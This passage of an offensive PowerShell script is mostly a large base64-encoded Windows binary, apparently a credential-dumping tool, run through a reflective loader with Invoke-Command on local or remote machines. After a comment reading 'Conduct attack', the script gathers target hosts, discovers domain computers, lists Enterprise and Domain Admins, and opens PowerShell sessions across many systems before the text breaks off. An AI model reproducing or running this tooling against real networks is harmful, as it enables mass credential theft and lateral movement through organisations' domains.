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LjcBOPc4/ziyOZQ6LTszO9U72zvrO4s8ojxFPTs+Qz72Ptg/AHABAHAAAABxMHcwGTEfMS8xzzHmMRYy5DNLNNk28DY7Oj86QzpHOks6TzpTOlc6WzpfOmM6Zzp0OuY64TvyOw48TTxkPG88vjzZPO48AT0mPWI9fj2ZPdg9ID4uPmY+nT64Ptc+6j73PqQ/uz8AAACAAQAYAAAADjAcMFUwbzDOMNQw2jDgMACQAQCIAgAA6DMoNCw0cDV0NXg1gDWINYw1kDWUNcg3zDfQN9Q33DfgN+Q3MDg0ODg4PDhAOEQ4SDhMOFA4VDhYOFw4YDhkOGg4bDhwOHQ4eDh8OIA4hDiIOIw4kDiUOJg4nDigOKQ4qDisOLA4tDi4OLw4wDjEOMg4zDjQONQ42DjcOOA45DjoOOw48Dj0OPQ5+Dn8OQA6BDoIOgw6EDoUOhg6HDogOiQ6KDosOjg6VDpYOlw6YDpkOmg6bDpwOnw6gDqEOpg6sDrIOuA65Dr4Ovw6EDsUOxg7HDsgOyQ7KDssOzA7NDs4Ozw7QDtEO1A7XDtgO2Q7aDtsO3A7dDt4O3w7gDuEO4g7jDuQO5w7qDusO7A7tDu4O7w7wDvEO8g7zDvQO9Q72DvcO+A75DvoO+w78Dv0O/g7/DsAPAQ8CDwMPBA8FDwYPBw8IDwkPCg8MDw8PEA8TDxYPFw8YDxkPGg8bDxwPHQ8eDx8PIA8hDyIPIw8kDyUPJg8nDygPKQ8qDysPLA8tDy4PLw8wDzEPMg8zDzQPNQ82DzcPOA85DzoPOw88Dz0PPg8/DwAPQQ9CD0MPRA9HD0oPSw9MD00PTg9RD1QPVQ9WD1cPWA9ZD1oPWw9cD10PXg9hD2QPZQ9mD2cPaA9pD2oPaw9sD20Pbg9vD3APcQ9yD3MPdA92D3cPeQ96D3wPfQ9AD4EPgg+DD4QPhQ+GD4cPiA+JD4oPiw+MD40Pjg+PD5APkw+4D7oPuw+8D74Pvw+CD8MPxg/HD8oPyw/MD84Pzw/QD9IP0w/UD9YP1w/aD9sP3g/fD+IP4w/mD+cP6g/rD+4P7w/yD/MP9A/2D/cP+A/6D/sP/g//D8AAACgAQAQAQAACDAMMBAwFDAYMBwwIDAkMCgwLDA4MEgwTDBQMFQwWDBcMGAwZDBoMGwwcDB0MHgwfDCAMIQwiDCMMJAwlDCgMKQwqDCwMLgwwDDIMNAw2DDgMOgw8DD0MPgw/DAAMQQxCDEMMRAxFDEYMRwxIDEkMSgxLDEwMTQxODE8MUAxRDFIMUwxUDFYMWAxaDFwMXgxgDGIMZAxmDGgMagxsDG4McAxyDHQMdgx+DH8MQAyBDIIMgwyEDIUMhgyHDIgMiQyKDIsMjAyNDI8MkAyRDJIMkwyUDJUMlgyXDJgMmQyaDJsMnAydDJ4MnwygDKEMogyjDKQMpQymDKcMqAypDKoMrAytDK4MgAAAJACADAAAACQOpg6nDqkOqg6sDq0Orw6wDrIOsw61DrYOuA65DrsOvA6DDsQOwAAAMACANQAAAAQMBQwMDAwMzQzPDOIM8QzADQ8NHg0rDSwNLg08DQsNWg1nDWgNag12DUMNhA2GDY4Njw2RDZ0Nqg2rDa0NgA3PDd4N7Q38DcsOGg4nDigOKQ4qDi0OPA4LDloOZw5qDnIOcw51DkgOlw6mDrUOhA7TDuAO4Q7iDuMO5A7lDuYO5w7oDukO6g7rDuwO7Q7yDsEPEA8fDywPLQ8ED0YPUw9VD2IPZA9xD3MPVA+WD6MPpQ+yD7QPgQ/DD84Pzw/QD9EP0g/TD9QP4g/xD8A0AIAzAAAAAAwSDBQMHwwgDCEMIgwjDCQMJQwmDDgMBwxWDGUMcgx9DH4MfwxADIEMggyIDIoMlwyZDKYMqAy1DLcMggzDDMQMxQzGDMcMyAzJDMoM5AzmDPMM9QzCDQQNEQ0TDSANIg0vDTENCg1MDVkNWw1oDWoNeA1HDZYNrA2uDbsNvQ2KDcwN2A3jDeQN5Q3mDecN6A3pDeoN6w3sDe0N7g3vDfAN8Q3yDfMN9A31DfYN9w34DfkN+g37DfwN/Q3+Df8NwA4BDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
	}
}

Main
}
'@


        }

        # Conduct attack
        Process 
        {

            # ----------------------------------------
            # Compile list of target systems
            # ----------------------------------------

            # Get list of systems from the command line / pipeline            
            if ($Hosts)
            {
                Write-verbose "Getting list of Servers from provided hosts..."
                $Hosts | 
                %{ 
                    $TblServers.Rows.Add($_) | Out-Null 
                }
            }

            # Get list of systems from the command line / pipeline
            if($HostList){
                Write-verbose "Getting list of Servers $HostList..."                
                if (Test-Path -Path $HostList){
                    $HostListHosts += Get-Content -Path $HostList
                    $HostListHosts|
                    %{
                        $TblServers.Rows.Add($_) | Out-Null
                    }
                }else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                }            
            }

            # Get list of domain systems from dc and add to the server list
            if ($AutoTarget)
            {
                if ($OsFilter){
                    $FlagOsFilter = "$OsFilter"
                }else{
                    $FlagOsFilter = "*"
                }


                if ($WinRM){
                    Get-DomainComputers -WinRM -OsFilter $OsFilter
                }else{
                    Get-DomainComputers -OsFilter $OsFilter
                }
            }


            # ----------------------------------------
            # Get list of entrprise/domain admins
            # ----------------------------------------
            if ($AutoTarget)
            {
                Write-Verbose "Getting list of Enterprise and Domain Admins..."
                if ($DomainController -and $Credential.GetNetworkCredential().Password)            
                {           
                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins" -DomainController $DomainController -Credential $Credential
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins" -DomainController $DomainController -Credential $Credential
                }else{

                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins"
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins"
                }
            }


            # ----------------------------------------
            # Establish sessions
            # ---------------------------------------- 
            $ServerCount = $TblServers.Rows.Count

            if($ServerCount -eq 0){
                Write-Verbose "No target systems were provided."
                break
            }

            # Fix incase servers in list are less than maxhosts
            if($ServerCount -lt $MaxHosts){
                $MaxHosts = $ServerCount
            }

            Write-Verbose "Found $ServerCount servers that met search criteria."            
            Write-verbose "Attempting to create $MaxHosts ps sessions..."

            # Set counters
            $ServerCounter = 0     
            $SessionCount = 0   

            $TblServers | 
            ForEach-Object {
                if ($Counter -le $ServerCount -and $SessionCount -lt $MaxHosts){
                    
                    $ServerCounter = $ServerCounter+1
                   
                    # attempt session
                    [string]$MyComputer = $_.ComputerName                        
